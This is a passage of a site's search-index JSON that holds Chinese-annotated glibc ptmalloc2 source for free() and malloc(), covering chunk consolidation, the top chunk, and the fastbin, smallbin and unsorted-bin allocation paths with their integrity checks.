\u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk if (nextchunk != av->top) { /* get and clear inuse bit */ // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 nextinuse = inuse_bit_at_offset(nextchunk, nextsize); // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 /* consolidate forward */ if (!nextinuse) { unlink(av, nextchunk, bck, fwd); size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 // unsorted bin \u94fe\u5934 bck = unsorted_chunks(av); // unsorted bin \u987a\u6570\u7b2c\u4e00\u4e2a\uff08\u6700\u65b0\u653e\u5165\uff09 fwd = bck->fd; // \u7b80\u5355\u7684\u68c0\u67e5 if (__glibc_unlikely(fwd->bk != bck)) { errstr = \"free(): corrupted unsorted chunks\"; goto errout; } p->fd = fwd; p->bk = bck; // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 if (!in_smallbin_range(size)) { p->fd_nextsize = NULL; p->bk_nextsize = NULL; } bck->fd = p; fwd->bk = p; set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); }","title":"\u4e0b\u4e00\u5757\u4e0d\u662f top chunk - \u524d\u5411\u5408\u5e76 - \u5408\u5e76\u9ad8\u5730\u5740 chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#top-chunk-top-chunk","text":"/* If the chunk borders the current high end of memory, consolidate into top */ // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk else { size += nextsize; set_head(p, size | PREV_INUSE); av->top = p; check_chunk(av, p); }","title":"\u4e0b\u4e00\u5757\u662f top chunk - \u5408\u5e76\u5230 top chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#_5","text":"/* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 if ((unsigned long) (size) >= FASTBIN_CONSOLIDATION_THRESHOLD) { // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 if (have_fastchunks(av)) malloc_consolidate(av); // \u4e3b\u5206\u914d\u533a if (av == &main_arena) { #ifndef MORECORE_CANNOT_TRIM // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c if ((unsigned long) (chunksize(av->top)) >= (unsigned long) (mp_.trim_threshold)) systrim(mp_.top_pad, av); #endif // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info *heap = heap_for_ptr(top(av)); assert(heap->ar_ptr == av); heap_trim(heap, mp_.top_pad); } } if (!have_lock) { assert(locked); __libc_lock_unlock(av->mutex); }","title":"\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#mmap-chunk_1","text":"} else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk(p); }","title":"\u91ca\u653e mmap \u7684 chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#systrim","text":"","title":"systrim"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#heap_trim","text":"","title":"heap_trim"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/#munmap_chunk","text":"","title":"munmap_chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/","text":"\u7533\u8bf7\u5185\u5b58\u5757 Allocate Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 __libc_malloc \u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709 malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002 \u8be5\u51fd\u6570\u4f1a \u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09 \uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5806\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002 // wapper for int_malloc void *__libc_malloc(size_t bytes) {//size_t \u4e3a\u5f53\u524d\u7a0b\u5e8f\u4f4d\u6570\u6700\u957f\u7684\u65e0\u7b26\u53f7int\u578b mstate ar_ptr; void * victim; // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook); if (__builtin_expect(hook != NULL, 0))//\u94a9\u5b50\u4e0d\u4e3a\u7a7a return (*hook)(bytes, RETURN_ADDRESS(0));//\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002 arena_get(ar_ptr, bytes); \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002 victim = _int_malloc(ar_ptr, bytes); \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002 /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim && ar_ptr != NULL) { LIBC_PROBE(memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry(ar_ptr, bytes); victim = _int_malloc(ar_ptr, bytes); } \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002 if (ar_ptr != NULL) __libc_lock_unlock(ar_ptr->mutex); \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58 \u8981\u4e48\u662f mmap \u7684\u5185\u5b58 \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684 arena \u4e2d assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim))); \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002 return victim; } _int_malloc _int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684 \u5185\u5b58\u5757\u5927\u5c0f \u4ee5\u53ca \u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6 \uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002 \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002 \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002 \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002 \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684 chunk \u5927\u5c0f\u3002 static void *_int_malloc(mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size(bytes, nb); arena /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if (__glibc_unlikely(av == NULL)) { void *p = sysmalloc(nb, av); if (p != NULL) alloc_perturb(p, bytes); return p; } fast bin \u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) <= (unsigned long) (get_max_fast())) {//\u7533\u8bf7\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8efastbin\u4e0a\u9650 // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 idx = fastbin_index(nb); // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 mfastbinptr *fb = &fastbin(av, idx);//\u5355\u94fe\u8868 mchunkptr pp = *fb; // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim->fd, victim)) != victim); // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk if (victim != 0) { // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; } // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 check_remalloced_chunk(av, victim, nb); // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } } \u5c0f\u603b\u7ed3 malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b fastbin \u662f\u4ece\u5934\u7ed3\u70b9\uff08\u6700\u65b0\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u540e\u51fa\u201d fast bin malloc \u68c0\u67e5\u673a\u5236 \u4e0d\u542f\u52a8 DEBUG \u65f6\uff0c\u53ea\u68c0\u67e5\u5373\u5c06\u5206\u914d chunk \u5bf9\u5e94\u7684 idx \u662f\u5426\u4e0e\u7533\u8bf7\u65f6\u7684 idx \u4e00\u81f4 \uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a chunksize(victim) \uff1a\u63d0\u53d6 victim size fastbin_index() \uff1a\u67e5\u627e victim size \u5bf9\u5e94\u7684 idx != idx \uff1a\u68c0\u67e5\u662f\u5426\u76f8\u7b49\uff0c\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u8c03\u7528 malloc_printerr \u6253\u5370\u9519\u8bef\u4fe1\u606f small bin \u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range(nb)) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index(nb); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at(av, idx); // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if ((victim = last(bin)) != bin) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if (victim == 0) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate(av); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim->bk; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if (__glibc_unlikely(bck->fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset(victim, nb); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin->bk = bck; bck->fd = bin; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if (av != &main_arena) set_non_main_arena(victim); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk(av, victim, nb); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } } } \u5c0f\u603b\u7ed3 malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b smallbin \u662f\u4ece\u6700\u540e\u7ed3\u70b9\uff08\u6700\u5148\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u5148\u51fa\u201d small bin malloc \u68c0\u67e5\u673a\u5236 \u6b65\u9aa4\u5982\u4e0b\uff1a bck = victim->bk; | (bck->fd != victim) \uff1a\u68c0\u67e5\u5373\u5c06\u5206\u914d\u7684\u7684 victim \u7684\u4e0a\u4e00\u4e2a chunk \u7684 fd \u6307\u9488\u662f\u5426\u6307\u5411 victim \u9632\u6b62\u4f2a\u9020 set_inuse_bit_at_offset(victim, nb); \uff1a\u4fee\u6539 victim \u7684 size inuse \u4f4d bin->bk = bck; | bck->fd = bin; \uff1a\u4fee\u6539\u94fe\u8868\u5c06 victime \u53d6\u51fa\u6765\uff08small bin \u6700\u540e\u4e00\u4e2a\uff09 large bin \u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684 chunk\uff0c\u800c\u662f \u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1 malloc_state \u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684 chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d \uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662f ptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 idx = largebin_index(nb); // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin if (have_fastchunks(av)) malloc_consolidate(av); } \u5927\u5faa\u73af - \u904d\u5386 unsorted bin 2020.07.08 largebin \u5206\u914d\u673a\u5236\u4e0d\u592a\u660e\u767d \u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk \u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662f large chunk \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002 \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c \u6309\u7167 FIFO \u7684\u65b9\u5f0f\u9010\u4e2a\u5c06 unsorted bin \u4e2d\u7684 chunk \u53d6\u51fa\u6765 \u5982\u679c\u662f small request\uff0c\u5219\u8003\u8651\u662f\u4e0d\u662f\u6070\u597d\u6ee1\u8db3\uff0c\u662f\u7684\u8bdd\uff0c\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c\u4e0d\u662f\u7684\u8bdd\uff0c\u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9 fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914d small bin chunk\u3002 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0; unsorted bin \u904d\u5386 \u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002 \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002 // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a // First In First Out while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) { // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk bck = victim->bk; // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0)) malloc_printerr(check_action, \"malloc(): memory corruption\", chunk2mem(victim), av); // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 size = chunksize(victim); SMALL REQUEST \u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk \uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u540e\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ //\u662f\u5426\u662fsmallbin\u8303\u56f4\uff1bbck\u662f\u5426\u662f\u94fe\u9996\uff1bremainder\u662f\uff08\u5206\u914d\u5b8c\uff09\u5269\u4f59\u90e8\u5206 if (in_smallbin_range(nb) && bck == unsorted_chunks(av) && victim == av->last_remainder && (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) { /* split and reattach remainder */ // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f remainder_size = size - nb; // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e remainder = chunk_at_offset(victim, nb); // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 // av\u662f\u88ab\u53d6\u51fachunk\u7684\u4e0b\u4e00\u4e2achunk\uff08fd\uff09 unsorted_chunks(av)->bk = unsorted_chunks(av)->fd = remainder; // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder av->last_remainder = remainder; // \u66f4\u65b0last remainder\u7684\u6307\u9488 remainder->bk = remainder->fd = unsorted_chunks(av); if (!in_smallbin_range(remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0cinuse set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 set_head(remainder, remainder_size | PREV_INUSE); // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 set_foot(remainder, remainder_size); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk(av, victim, nb); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, 